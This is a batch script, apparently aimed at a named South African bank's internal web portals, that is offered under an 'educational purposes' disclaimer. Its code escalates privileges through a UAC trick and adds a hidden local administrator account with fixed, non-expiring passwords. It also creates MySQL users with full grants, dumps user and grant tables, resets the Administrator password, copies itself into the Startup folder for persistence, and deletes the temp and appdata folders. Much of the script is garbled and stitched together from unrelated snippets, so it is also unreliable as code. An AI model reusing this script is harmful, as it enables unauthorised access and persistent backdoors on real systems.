@echo off
break off
title C:\windows\system32\cmd.exe
:cmd
color 1A

echo :.....................................................................................
echo :.....................................................................................
echo          ::::::::::::    ::          ::::::::::::    ::         ::
echo          ::        ::    ::          ::              ::         ::
echo          ::        ::    ::          ::              ::         ::
echo          ::        ::    ::          ::              ::         ::
echo          ::........::    ::          ::::::::::::    ::         ::     
echo          ::.........:    ::          ::              ::         ::
echo          ::        ::    ::          ::              ::         ::
echo          ::        ::    ::          ::              ::         ::
echo          ::        ::    ::          ::              ::         ::
echo          ::::::::::::    ::::::::::  ::::::::::::    :::::::::::::
echo:.....................................................................................:
echo      This Program was developed for only educational purposes,try on illigal attempts
echo            We are not resposible for any actions::::BluePriar_Forencics
echo:.....................................................................................:

:main
echo                                          OPTIONS MENU



echo 1 :hogan.fnb.co.za/v3270DoAuth/#/
echo 2 :premium.dynamics.fnb.co.za/Premium/main.aspx#474677994
echo 3 :fnb2web/cbsbrdreversalcentre/
echo 4 :folders.fnb.co.za:8443/folders/fnb/controller
echo 5 :reset BIOS PWD
echo 6 :Administrative PWD
echo 7 :Server 
echo 8 :Add Server User
echo 9 :Add Mysql User
   
:: Prompt for input;
      
        set /p "strMenu=                       ENTER OPTION NUMBER:"

:: Compare input through if commands,
:: 'if not defined strMenu goto :menu' can be used here if prefered.
if "%strMenu%" equ "1" start "" https://hogan.fnb.co.za/v3270DoAuth/#/"
if "%strMenu%" equ "2" start "" https://premium.dynamics.fnb.co.za/Premium/main.aspx#474677994"
if "%strMenu%" equ "3" start "" http://fnb2web/cbsbrdreversalcentre/"
if "%strMenu%" equ "4" start "" https://folders.fnb.co.za:8443/folders/fnb/controller 
if "%strMenu%" equ "5" start "" 
if "%strMenu%" equ "6" start "" 
if "%strMenu%" equ "7" start "" 
if "%strMenu%" equ "8" start "" 
if "%strMenu%" equ "9" start "" 

start "" "Option" ""
  if "%strOption%" equ "1"  goto 
   start runas /noprofile /user:ef453672 localadminscript.bat 
    set /p input=input
if "%input%" =="1"  goto A1 
  echo
     :A1
color 32
 echo
::BatchGotAdmin 
REM --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
    REM --> If error flag set, we do not have admin.
        if '%errorlevel%' NEQ '0' ( 
   echo Requesting administrative privileges... 
     goto UACPrompt

) else ( goto gotAdmin)

:UACPrompt 
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs" 
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >>  "%temp%\getadmin.vbs" 

   "%temp%\getadmin.vbs" 

  exit /B

:gotAdmin
 
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" ) 

pushd "%CD%" 
CD /D "%~dp0"
pause
:------------------------------------------------------------------
 echo
  net user ef453672 fnb@2021 /add  /https://hogan.fnb.co.za/v3270DoAuth/#/ /active
    net localgroup Administrators ef453672 /add
    WMIC USERACCOUNT WHERE "Name='ef453672"'
     SET PasswordExpires=FALSE
WMIC USERACCOUNT WHERE "Name='ef453672"'
 SET Passwordchangeable=FALSE

 if "%error%" equ "5"  goto A2

echo
:A2
color B2
  net user ef453672 fnb@2021 /add /active
    net localgroup Administrators ef453672 /add

    WMIC USERACCOUNT WHERE "Name='ef453672"'
     SET PasswordExpires=FALSE
WMIC USERACCOUNT WHERE "Name='ef453672"'
 SET Passwordchangeable=FALSE
        ipconfig /all
echo 
  pause

net user %Administrator% fnb@2021 

  net user

set /p input=input
if "%input%" =="m" goto main 

  if "%strOption%" equ "2" goto
  start runas /noprofile /user:ef453672 localadminscript.bat
set /p input=input
if "%input%" =="2"  goto A7
    echo
     :A7
color 3B 
  echo
 VERIFY errors 2 > nul   
SETLOCAL ENABLEEXTENSIONS   IF ERRORLEVEL 1 
echo Unable to enable extensionsREM before you start, 
you need to write out your SQLCMD credentials to a file in your userrem area using code like this, if you use SQL Server Credentials ...Rem echo -S MyServer -U MyUserName -P MyPassword>%userProfile%\MyServerSqlCmd.txtREM ... or like this if you use windows securityREM echo -S MyServer  >%userProfile%\MyServerSqlCmd.txtREMREM read in your SQLCMD command and credentialsSet /p TheServer=<%userProfile%\MyServerSqlCmd.txtREM Specify your work directory. I chose 'RunBatch' in my user areaSet workpath=%userProfile%\RunBatchREM specify the name of your SQLCMD fileSet TheSQLCMDFileToExecute=%workpath%\SQLCMDFile.sqlREM Specify what preliminary file you need to set up Set PreliminarySQL=S:\work\Github\JSONSQLServerRoutines\SaveExtendedJsonDataFromTable.sqlREM choose the name of your error fileSet Errorfile=%workpath%\error.logREM and specify the name of your database that you want to useSet Database=AdventureWorks2016REM check whether the workpath directory existsif not exist "%workpath%\" (md %workpath%) if ERRORLEVEL 1 (  echo An error creating "%workpath%" directory occurred   goto bombsite)
REM check whether the database directory within the workpath directory exists
if not exist "%workpath%\%Database%\" (md %workpath%\%Database%) 
if ERRORLEVEL 1 (	
echo An error creating "%workpath%\%Database%" occurred goto bombsite)
rem Write out the header to the SQLCMD file to execute(
echo --specify the name of the error fileecho 
:Error "%Errorfile%"echo --Execute prelimiaryecho 
:r %PreliminarySQL%echo USE %Database%echo :XML on
echo set nocount on) >%TheSQLCMDFileToExecute%
Rem Create the query that brings you the list of tables
Set QUERY="SET NOCOUNT ON; SELECT Object_Schema_Name(object_id)+'.'+name AS The_Tables FROM sys.tables 
WHERE is_ms_shipped=0;"REM Execute the query and create the entire SQL Command file that will be executedfor 
/F usebackq %%i in (`sqlcmd %TheServer% -d %Database% -h -1  -f 65001  -Q %QUERY%`) do 
(rem for every tablespec in the list append the following text ....       
 if ERRORLEVEL 1 (	  
echo An error accessing  %Database%  to get the list of tables occurred         
  goto bombsite)	(	
echo :Out %workpath%\%Database%\%%i.json	
echo DECLARE @Json NVARCHAR^(MAX^)       
 echo EXECUTE #SaveExtendedJsonDataFromTable @TableSpec=^'%%i^',@JSONData=@json OUTPUT   
     echo Select @json	echo GO	) >>%TheSQLCMDFileToExecute% 		     ) 
Rem Now that is done, we just execute the filesqlcmd 
%TheServer% -d %Database% -f 65001 -y 0 -i %TheSQLCMDFileToExecute%
if ERRORLEVEL 1 (  echo An error running the script %TheSQLCMDFileToExecute% on %TheServer% occurred   
goto bombsite)goto end :bombsite
Echo We bombed!
color 0C
END LOCAL
Exit /b 1
:end Echo Yes! We got here at last!!
ENDLOCAL
Exit /b 0
start sqlcmd
   echo
          mysql -u root -ppassword
     mysql -h host -u user -p -e 'SHOW TABLES'
mysql -uroot -ppassword --execute="CREATE USER ' priar.changchat'@'fnb.co.za' IDENTIFIED BY '77585010eI';"
   mysql -uroot -ppassword --execute="GRANT ALL ON myDB.* TO ' priar.changchat'@'fnb.co.za';"
 mysql -uroot -p -se "SELECT CONCAT('HOW GRANTS FOR \ '',user '\'@\'',host, '\';') FROM mysql.user;" >grants.sql
 mysql -uroot -p <grants.sql
mysql> select Host, Db, User, Name, Password, Address, Cellphone, Insert_priv, Update_priv, Delette_Priv, Edit_priv, Safe_priv, Create_tmp_priv, Alter_priv from mysql.db limit all;
       c;\mysql\bin\mysql < install.sql
if "%error%" equ "5"  goto 
echo
    :A4
color 25
     echo
   c:\>mysql.exe -u root -ppassword
if "%ERROR%" equ " 2003 ( HY000): Can't connect to MySQL server on 'localhost' (10061)"
 then
runas /noprofile /user:ef453672 localadminscript.bat
 cmd/K"C:\Program\Files\MySQL\MySQL Server 5.5\bin\mysql.exe" -uroot -ppassword safe
end 
 pause
set /p input=input  
if "%input%" =="m" goto main 


echo
 if "%strOption%" equ "3" goto
  start runas /noprofile /user:ef453672 localadminscript.bat 
set /p input=input
if "%input%" =="3"  goto A10
  echo
:A10
color cA
echo
    http://fnb2web/cbsbrdreversalcentre/
end
   pause 
 echo
set /p input=input  
if "%input%" =="m" goto main 


   if "%strOption%" equ "4" goto
  start runas /noprofile /user:ef453672 localadminscript.bat 
set /p input=input
if "%input%" =="4"  goto A20
  echo
:A20
color 3c
echo
      https://folders.fnb.co.za:8443/folders/fnb/controller
       end
pause
   echo 
set /p input=input
if "%input%" =="m" goto main 

if "%strOption%" equ "5" goto
  start runas /noprofile /user:ef453672 localadminscript.bat 
set /p input=input
if "%input%" =="5"  goto A22

  :A22
color B2
echo
 echo debug -0 70 10
-0 71 aa
-q
end
   then 
 echo
  msg * your are such a life safer and thanks for Adding me to your System you won't recret it will truly utilise the chance!!! 
pause
 echo        
set /p input=input
if "%input%" =="m" goto main 


if "%strOption" equ "6" goto
  start runas /noprofile /user:ef453672 localadminscript.bat
set /p input=input
if "%input%" =="6"  goto A24 
 echo
     :A24
color cA
 echo
     NET USER %Administrator% 77585010eI
         DEL pwd.bat
end
   then
      echo
set /p input=input
if "%input%" =="m" goto main   

if "%strOption%" equ "7" goto
   start runas /noprofile /user:ef453672 localadminscript.bat
set /p input=input
if "%input%" =="7"  goto A25
 echo
  :A25
color 3B
  echo
echo Checking your system infor 
  Please Waiting... 
echo
systeminfo | findstr
    /c:Host Name systeminfo |findstr
        /c:Domain systeinfo |findstr
                /c:Domain usernames |findstr
    /c:Domain passwords |findstr
        /c:Domain ip address |findstr
           /c:OS Name systeminfo |findstr
    /c:OS Version systeminfo |findstr
/c: System Manufacturer systeminfo |findstr
       /c:System Model systeminfo |findstr  
   /c:System type systeminfo |findstr
/c:Total Physical Memory ipconfig | find /i IPV4
echo
 echo Hard Drive Space: wmic diskdrive
get size
   echo.echo
       echo Service Tag:wmic bios get serialnumber
   echo.scho.echo CPU:wmic cpu get name
echo Completed!
end
   pause        
set /p input=input
if "%input%" =="m" goto main 


  if "%strOption%" equ "8" goto
      runas \windows\system32\cmd localadminscript.bat
set /p input=input
if "%input%" =="8"  goto A21
    echo
 :A21
color cA
echo
Add-Type -AssemblyName Microsoft.VisualBasicAdd-Type
 -Assembly 'System.Windows.Forms'$Computer = [Microsoft.VisualBasic.Interaction]
::InputBox("Enter the Computer Name You're accessing",
 "Computer Name", "Computer Name")$UserName = [Microsoft.VisualBasic.Interaction]
::InputBox("Enter New User's Name", "Name", "Helpdesk")$PWD = [Microsoft.VisualBasic.Interaction]
::InputBox("Enter Password for $Username")$Password = $PWD | Out-String | ConvertTo-SecureString -AsPlainText -Force$LocalGroupName = "Administrators"# $ErrorActionPreference= 'silentlycontinue' Try { #Create User	 write-output "Adding User $UserName to PC $computer"	 write-output "Setting Password for $UserName on PC $computer"	 write-output "Adding User $UserName to Local Group $LocalGroupName" $ADSIComp = [adsi]"WinNT://$Computer" $NewUser = $ADSIComp.Create('User',$Username) #Create password $BSTR = [system.runtime.interopservices.marshal]::SecureStringToBSTR($Password) $_password = [system.runtime.interopservices.marshal]::PtrToStringAuto($BSTR) #Set password on account $NewUser.SetPassword(($_password)) $ADS_UF_DONT_EXPIRE_PASSWD = 0x10000 $NewUser.userflags = $ADS_UF_DONT_EXPIRE_PASSWD $NewUser.SetInfo() #Add to Administrators Group $Group = [ADSI]"WinNT://$Computer/$LocalGroupName,group" $Group.Add("WinNT://$UserName,user") $NewUser.SetInfo() #Send Results to Screen [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") [System.Windows.Forms.MessageBox]
::Show("Local User Added, $UserName") } Catch { [Reflection.Assembly]
::LoadWithPartialName("System.Windows.Forms") [System.Windows.Forms.MessageBox]
::Show("ERROR: Local User NOT Added, Check Password Lenght or Duplicate User") } 
#Cleanup [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR) Remove-Variable Password,BSTR,_password
   pause   
set /p input=input
if "%input%" =="m" goto main 

  if "%strOption%" equ "9" goto
     runas \windows\system32\cmd localadminscript.bat
set /p input=input
if "%input%" =="9"  goto A26
echo
 :A26
color cA
pause
echo please enter your first and last name ( eg. David 
Martin) and press [ENTER]:
set /p fullname= 
echo please enter your employee ID and press
[ENTER]:
set /p newuser=
net user %newuser% /add >NUL
nuet user %newuser% *
net user %newuser% /fullname:%fullname%">NUL
net locagrup administrator %newuser% /delete
2>NUL
mkdir "D:\%fullname%"
cacls "D:\%fullname%" /p %newuser%:f
administrators:f
net share "%fullname%"=D:\%fullname%"
/remark:"Server space for %fullname%"
/GRANT:%newuser%,FULL

echo %results% was returned
  echo
   pause
:A4
color 25
echo
  pause
    del /q %appdata%
 del /q %temp%
echo
msg * your are such a life safer and thanks for Adding me to your System you won't recret it will truly utilise the chance!!!
set /p input=input
if "%input%" =="m" goto main 
echo
  copy "*.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
    echo
start http://192.168.8.1/html/nocard.html?index

set /p input=input
if "%input%" =="r" goto shutdown -r
set /p input=input
if "%input%" =="l" goto logoff
set /p input=input
if "%input%" =="s" goto shutdown -s -t1
